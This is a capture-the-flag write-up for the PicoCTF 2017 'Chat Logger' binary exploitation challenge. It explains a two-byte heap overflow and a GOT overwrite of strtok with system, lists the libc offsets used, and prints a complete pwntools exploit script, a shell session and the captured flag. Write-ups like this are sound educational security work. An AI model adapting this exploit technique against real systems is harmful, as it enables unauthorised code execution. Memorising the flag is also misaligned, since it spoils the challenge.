# PicoCTF_2017: Chat Logger

**Category:** Binary Exploitation

**Points:** 200

**Description:**

You've been given admin access to the chat logs for our organization to help clean up the language. See if you can get a shell on shell2017.picoctf.com:36069. [chat-logger](https://webshell2017.picoctf.com/static/b3322fd6f9446f38d9de16c803a75148/chat-logger)  [Source](https://webshell2017.picoctf.com/static/b3322fd6f9446f38d9de16c803a75148/server.c)

**Hint:**

- You should make some chat room log files to run this program locally.
- Learning about  [ptmalloc2](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)  might help. glibc uses a modified version of it.
- Bear in mind that fopen allocates memory and fclose frees it.

## Write-up

Another difficult binary exploitation challenge. It took me way too much time to spot buffer overflow and the exploitation part was even worse.

The vulnerable function is

void update_message(chat_message_t msg, char *new_text) {
    size_t len = strlen(new_text) + 1;
    if (len > msg->length) {
        msg->text = xrealloc(msg->text, normalize_size(len));
    }
    strncpy(msg->text+2, new_text, len);
    message_add_status(msg, '*');
}

Variable  `len`  contains our message size plus one, but  `msg->length`  also includes 2 bytes for message status. It gives us opportunity to overflow buffer by two bytes.

My first idea was to add two messages at the end of any chat. I hoped that they would be next to each other in the memory, so by overflowing the first one I could mark the second one as free. Then I could just expand the first message to overwrite  `chat_message_t`  structure of the other.  `chat_message_t`  contains pointer to the buffer, so I could put  `.got.plt`  address there and leak where  `libc`  was loaded.

Unfortunately the messages were put in some "random" places in memory. I thought that for some length of the buffers they would be written in a "correct" order, but I didn't manage to find such lengths.

Luckily first message buffer was just before its struct, so we could perform the attack using only one message (but I still had to send two messages, because otherwise the program was crashing for some mysterious reason).

To get offsets of libc functions we can use radare2 on the webshell.

```
system 0x41490
strtok 0x84a60

```

And with IDA we can find the address of  `.got.plt`  in the application.

```
strtok@.got.plt 601EC0

```

`strtok@.got.plt`  address will become the need address of first message buffer. Please note that we need to subtract 2 from it, because the program puts  `*` on first two bytes and it would break our pointer (we can do this, because preceding pointer is useless - it's for  `perror`  function).

After overwriting the address we just need to type  `/bin/sh`  and we get the shell.
**Final Exploit**
```python
#!/usr/bin/env python2
from pwn import *
r = remote("shell2017.picoctf.com",36069)
r.recv()
r.send("find 2 You're not that funny.\n")
r.recv()
r.send("add 1337 %s\n"%("A"*21))
r.recv()
r.send("find 2 A\n")
r.recv()
r.send("add 1337 EOT%s\n"%("-"*100))
r.recv()
r.send("find 2 A\n")
r.recv()
r.send("edit %s\n"%("A"*22))
r.recv()
r.send("find 2 A\n")
r.recv()
r.send("edit %s\n"%("A"*46+"\xbe\x1e\x60"))
r.recv()
r.send("chat 2\n")
res = r.recvuntil("EOT---")
r.recv()
strtok_libc = int(res.splitlines()[-2][-6:][::-1].encode('hex'),16)
libc_base = strtok_libc-0x84a60
system_libc = libc_base+0x41490
r.send("edit %s\n"%(hex(system_libc)[2:].decode('hex')[::-1]))
r.recv()
r.send("/bin/sh\n")
r.interactive()
```
```text
$ python chat.py 
[+] Opening connection to shell2017.picoctf.com on port 36069: Done
[*] Switching to interactive mode

> $ ls
chat-logger
flag.txt
room.0.log
room.1.log
xinetd_wrapper.sh
$ cat flag.txt
164579d8d535184967061cc94ec029c5
```
The flag is  `164579d8d535184967061cc94ec029c5`.
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTczNjQ5MTcwNCwtMTE4OTEwNDIzNl19
-->